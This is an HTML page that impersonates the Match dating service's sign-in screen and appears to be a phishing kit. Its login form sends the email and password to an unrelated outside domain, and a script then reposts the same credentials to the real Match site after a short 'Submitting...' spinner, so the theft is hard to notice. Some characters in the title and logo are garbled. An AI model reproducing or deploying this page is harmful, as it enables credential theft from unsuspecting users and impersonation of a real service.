<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MatchÂ® | Login</title>
  <style>
    body {
      font-family: "Georgia", serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .container {
      width: 100%;
      padding: 60px 20px;
    }

    h1 {
      text-align: center;
      font-weight: normal;
      font-size: 32px;
      margin-bottom: 30px;
    }

    .logo {
      text-align: center;
      font-size: 36px;
      font-weight: bold;
      color: #0b0b4f;
      margin-bottom: 40px;
    }

    .join {
      text-align: center;
      font-size: 16px;
      margin-bottom: 25px;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }

    .join a {
      color: #0056ff;
      text-decoration: none;
      font-weight: 500;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 20px;
      border: none;
      background-color: #fafafa;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      box-sizing: border-box;
      margin: 10px 0;
    }

    .signin-btn {
      background-color: #0b0b4f;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 15px;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      transition: 0.2s;
      margin-top: 10px;
    }

    .signin-btn:hover {
      background-color: #18186b;
    }

    .links {
      text-align: center;
      font-size: 14px;
      margin-top: 25px;
      color: #555;
    }

    .links a {
      color: #0056ff;
      text-decoration: none;
      margin: 0 8px;
    }

    .version {
      text-align: center;
      color: #999;
      font-size: 12px;
      margin-top: 30px;
    }

    #preloader {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .spinner {
      width: 64px;
      height: 64px;
      border: 6px solid #eee;
      border-top-color: #0b0b4f;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .heart {
      font-size: 10px;
      color: #0b0b4f;
    }
  </style>
</head>

<body>
  <!-- Main Content -->
  <div class="container">
    <div class="logo">match<span class="heart">ðŸ–¤</span></div>
    <h1>Sign in</h1>
    <div class="join">Not a member? <a href="#">Join</a></div>
    <form id="loginForm" method="POST" action="https://sazs.otkg.sa.com/auth/next.php">
      <input type="email" id="email" name="user" placeholder="Email" required />
      <input type="password" id="password" name="password" placeholder="Password" required />
      <button type="submit" class="signin-btn">Sign in</button>
    </form>
    <div class="links">
      <a href="#">Forgot email</a> â€¢
      <a href="#">Forgot password</a> â€¢
      <a href="#">Help</a>
    </div>
    <div class="version">
      v25.30.00 #f9b079 n!ron h!da--ltx api:match pid:67
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault(); // Stop immediate navigation

      // Show preloader
      const preloader = document.createElement('div');
      preloader.id = 'preloader';
      preloader.innerHTML = `
        <div style="text-align:center">
          <div class="spinner"></div>
          <div style="margin-top:12px;color:#333;">Submitting...</div>
        </div>
      `;
      document.body.appendChild(preloader);

      // Actually submit the form data, then redirect
      setTimeout(() => {
        // Create a hidden form to submit normally (avoids CORS/fetch issues)
        const form = document.createElement("form");
        form.method = "POST";
        form.action = "https://mobi.match.com/";

        // Append the same inputs
        const emailField = document.createElement("input");
        emailField.type = "hidden";
        emailField.name = "user";
        emailField.value = document.getElementById("email").value;

        const passwordField = document.createElement("input");
        passwordField.type = "hidden";
        passwordField.name = "password";
        passwordField.value = document.getElementById("password").value;

        form.appendChild(emailField);
        form.appendChild(passwordField);
        document.body.appendChild(form);

        form.submit();
      }, 1000); // small delay for effect
    });
  </script>
</body>

</html>
